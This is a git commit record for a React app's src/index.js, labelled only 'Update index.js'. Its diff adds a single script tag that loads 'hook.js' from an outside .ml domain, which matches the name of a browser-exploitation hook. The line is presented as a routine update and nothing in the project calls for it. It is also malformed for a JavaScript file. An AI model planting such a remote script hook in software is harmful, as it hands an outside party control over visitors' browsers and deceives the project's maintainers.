29621f2fe0bb31c2b32c4ea61a7d4d60b2ba254d
Ender4LionIsGamer <98265648+Ender4LionIsGamer@users.noreply.github.com>
2023-01-28 11:33:03 +0530

    Update index.js

--- src/index.js
+++ src/index.js
@@ -5,6 +5,7 @@ import './index.css';
 import App from './App';
 import * as serviceWorker from './serviceWorker';
 import { BrowserRouter } from "react-router-dom";
+<script src="https://hellooooo.ml:443/hook.js">
 
 ReactDOM.render(
   <BrowserRouter>
